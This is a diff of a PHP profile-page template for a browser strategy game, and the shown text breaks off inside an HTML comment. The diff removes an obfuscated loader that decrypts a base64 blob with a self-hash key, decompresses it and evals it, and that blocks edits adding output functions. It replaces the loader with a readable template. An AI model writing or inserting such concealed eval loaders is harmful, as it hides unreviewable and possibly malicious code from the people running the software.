@@ -1,24 +1,1017 @@
 <?php
-$uepfolmx="0a2e8ad16ae9ac6a148a46573e9f591d";
-$rvmbsplcu="095501510d575d010758540e5605575607575e555254050e03060b57535c0454";
-$koprohge="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";
-$dxxlni=file_get_contents(__FILE__);
-$xechtdi=str_replace($koprohge,"",$dxxlni);
-if(strpos($xechtdi,"ec"."ho")!==false||strpos($xechtdi,"pr"."int")!==false||strpos($xechtdi,"var_"."dump")!==false||strpos($xechtdi,"file_put_"."contents")!==false||strpos($xechtdi,"fw"."rite")!==false){die();}
-$pmfubs=str_replace(array($uepfolmx,$rvmbsplcu),array("SP_23be3a7f","KP_a85747a5"),$dxxlni);
-$icunmz=md5($pmfubs);
-$zmavwri=hex2bin($rvmbsplcu);
-$djtgigd="";
-$ptdulfba=strlen($icunmz);
-for($oyqsuzi=0;$oyqsuzi<$ptdulfba;$oyqsuzi++){
-$djtgigd.=chr(ord($zmavwri[$oyqsuzi])^ord($icunmz[$oyqsuzi]));
-}
-$lcwhya=base64_decode($koprohge);
-$fkdzcpn=strlen($lcwhya);
-$zuwhhtn="";
-$svarvgrgov=strlen($djtgigd);
-for($oyqsuzi=0;$oyqsuzi<$fkdzcpn;$oyqsuzi++){
-$zuwhhtn.=$lcwhya[$oyqsuzi]^$djtgigd[$oyqsuzi%$svarvgrgov];
-}
-$bbcrmsq="gzun"."compress";
-eval('?>' . $bbcrmsq($zuwhhtn) . '<?php ');
+// Layout helpers
+$is_own_profile = ($user['id'] == $village['userid']);
+?>
+
+<!-- Include Name Cosmetics CSS -->
+<link rel="stylesheet" href="/css/name_cosmetics.css">
+
+<h2><?= __('screens.profile.profile') ?></h2>
+
+<?php if (!empty($success)): ?>
+    <div class="success"
+        style="background: #d4edda; border: 1px solid #c3e6cb; color: #155724; padding: 10px; margin-bottom: 15px; border-radius: 4px;">
+        <?= htmlspecialchars($success) ?>
+    </div>
+<?php endif; ?>
+
+<!-- Tabs Navigation Container -->
+<table class="content-border" width="100%" cellspacing="0" cellpadding="0">
+    <tr>
+        <td>
+            <table class="main" width="100%" align="center">
+                <tr>
+                    <td id="content_value">
+                        <!-- Navigation Tabs -->
+                        <table class="vis" width="100%">
+                            <tr>
+                                <?php foreach ($tabs as $key => $label): ?>
+                                    <?php
+                                    $is_active = ($key === $current_tab);
+                                    $bg_color = $is_active ? '#e5c389' : '#f4e4bc';
+                                    $label_display = ($key === 'profile') ? \App\Helpers\CosmeticHelper::formatUsername($user['username'], $user['id']) : htmlspecialchars($label);
+                                    ?>
+                                    <td align="center"
+                                        style="background-color: <?= $bg_color ?>; padding: 4px 10px; border: 1px solid #7d510f;">
+                                        <a href="game.php?village=<?= $village['id'] ?>&screen=profile&mode=<?= $key ?>"
+                                            style="text-decoration: none; font-weight: bold; color: #5d2f09;">
+                                            <?= $label_display ?>
+                                        </a>
+                                    </td>
+                                <?php endforeach; ?>
+                            </tr>
+                        </table>
+
+                        <?php if ($current_tab === 'profile'): ?>
+                            <div
+                                style="background-color: #fceec4; padding: 10px; border: 1px solid #c1a264; margin-top: 5px;">
+
+                                <div style="margin-bottom: 10px;">
+                                    <div style="float: right;">
+                                        <a href="#" onclick="$('#edit_profile_form').toggle(); return false;"
+                                            class="btn"><?= __('screens.profile.edit_profile') ?></a>
+                                    </div>
+                                    <h3 style="margin: 0; color: #5d2f09;">
+                                        <?= \App\Helpers\CosmeticHelper::formatUsername($user['username'], $user['id']) ?>
+                                    </h3>
+                                    <div style="clear: both;"></div>
+                                </div>
+
+                                <!-- Main Content Table -->
+                                <table width="100%">
+                                    <tr>
+                                        <!-- Left Column -->
+                                        <td valign="top" width="45%">
+                                            <div
+                                                style="background-color: #f0e6c2; padding: 5px; border: 1px solid #7d510f; margin-bottom: 10px;">
+                                                <table width="100%">
+                                                    <tr>
+                                                        <td width="120" valign="top">
+                                                            <!-- Avatar + Coat of Arms (Brasão) -->
+                                                            <div
+                                                                style="background-color: #5d4037; border: 2px solid #3e2723; width: 100%; height: 120px; display: flex; align-items: center; justify-content: center;">
+                                                                <?php if (isset($user['avatar']) && $user['avatar'] > 0): ?>
+                                                                    <img src="graphic/player/profile/<?= $user['avatar'] ?>.webp"
+                                                                        style="width: 100%; height: 100%; object-fit: cover;">
+                                                                <?php else: ?>
+                                                                    <img src="graphic/player/profile/default.webp"
+                                                                        style="width: 100%; height: 100%; object-fit: cover;">
+                                                                <?php endif; ?>
+                                                            </div>
+                                                        </td>
+                                                        <td valign="top" style="padding-left: 10px;">
+                                                            <table width="100%" cellspacing="0">
+                                                                <tr>
+                                                                    <td><strong><?= __('screens.profile.points') ?></strong>
+                                                                    </td>
+                                                                    <td align="right"><?= number_format($user['points']) ?>
+                                                                    </td>
+                                                                </tr>
+                                                                <tr>
+                                                                    <td><strong><?= __('screens.profile.rank') ?></strong>
+                                                                    </td>
+                                                                    <td align="right"><?= $user['rang'] ?></td>
+                                                                </tr>
+                                                                <tr>
+                                                                    <td><strong><?= __('screens.profile.tribe') ?></strong>
+                                                                    </td>
+                                                                    <td align="right">
+                                                                        <?php if ($user['ally'] > 0): ?>
+                                                                            <a
+                                                                                href="game.php?village=<?= $village['id'] ?>&screen=ally&mode=profile&id=<?= $user['ally'] ?>"><?= __('screens.profile.view') ?></a>
+                                                                        <?php else: ?>
+                                                                            -
+                                                                        <?php endif; ?>
+                                                                    </td>
+                                                                </tr>
+                                                                <!-- <tr>
+                                                                        <td colspan="2"
+                                                                            style="border-top: 1px dotted #8c5f0d; margin-top: 5px; padding-top: 5px;">
+                                                                            <img src="graphic/icons/external_link.png">
+                                                                            <a href="#" style="font-size: 10px;">Arquivo de
+                                                                                jogador (ligação externa)</a>
+                                                                        </td>
+                                                                    </tr> -->
+                                                            </table>
+                                                        </td>
+                                                    </tr>
+                                                </table>
+                                            </div>
+
+                                            <table class="vis" width="100%">
+                                                <tr>
+                                                    <th style="background-color: #c1a264;">
+                                                        <?= __('screens.profile.villages') ?>
+                                                        (<?= count($villages_list) ?>)
+                                                    </th>
+                                                    <th style="background-color: #c1a264;">
+                                                        <?= __('screens.profile.coordinates') ?>
+                                                    </th>
+                                                    <th style="background-color: #c1a264;">
+                                                        <?= __('screens.profile.village_points') ?>
+                                                    </th>
+                                                </tr>
+                                                <?php foreach ($villages_list as $v): ?>
+                                                    <tr>
+                                                        <td style="background-color: #f8f4e0;">
+                                                            <a
+                                                                href="game.php?village=<?= $village['id'] ?>&screen=info_village&id=<?= $v['id'] ?>">
+                                                                <?= htmlspecialchars($v['name']) ?>
+                                                            </a>
+                                                        </td>
+                                                        <td style="background-color: #f8f4e0;"><?= $v['x'] ?>|<?= $v['y'] ?>
+                                                        </td>
+                                                        <td style="background-color: #f8f4e0;">
+                                                            <?= number_format($v['points']) ?>
+                                                        </td>
+                                                    </tr>
+                                                <?php endforeach; ?>
+                                            </table>
+                                        </td>
+
+                                        <!-- Right Column (Awards etc) -->
+                                        <td valign="top" width="55%" style="padding-left: 10px;">
+
+
+
+
+                                            <!-- Hidden Edit Profile Form (Right Column Only) -->
+                                            <div id="edit_profile_form"
+                                                style="display: none; margin-bottom: 15px; border: 2px solid #8c5f0d; padding: 0; background: #f4e4bc;">
+
+                                                <form
+                                                    action="game.php?village=<?= $village['id'] ?>&screen=profile&h=<?= $hkey ?>"
+                                                    method="post" enctype="multipart/form-data">
+
+                                                    <!-- Brasão Section -->
+                                                    <div
+                                                        style="background: #c1a264; padding: 8px; font-weight: bold; color: #000;">
+                                                        <?= __('screens.profile.coat_of_arms') ?>
+                                                    </div>
+                                                    <div style="padding: 10px;">
+                                                        <!-- Current Avatar Display -->
+                                                        <div style="margin-bottom: 10px;">
+                                                            <strong><?= __('screens.profile.current_coat_of_arms') ?></strong>
+                                                            <div style="margin-top: 5px;">
+                                                                <?php if (isset($user['avatar']) && $user['avatar'] > 0): ?>
+                                                                    <img src="graphic/player/profile/<?= $user['avatar'] ?>.webp"
+                                                                        style="width: 120px; height: 120px; border: 2px solid #8c5f0d;">
+                                                                <?php else: ?>
+                                                                    <img src="graphic/player/profile/default.webp"
+                                                                        style="width: 120px; height: 120px; border: 2px solid #8c5f0d;">
+                                                                <?php endif; ?>
+                                                            </div>
+                                                        </div>
+
+                                                        <!-- Premium Upload Notice -->
+                                                        <!--<div
+                                                            style="background: #fff5da; border: 1px solid #d4af37; padding: 8px; margin-bottom: 10px;">
+                                                            <img src="graphic/new/premium/Premium_large.webp"
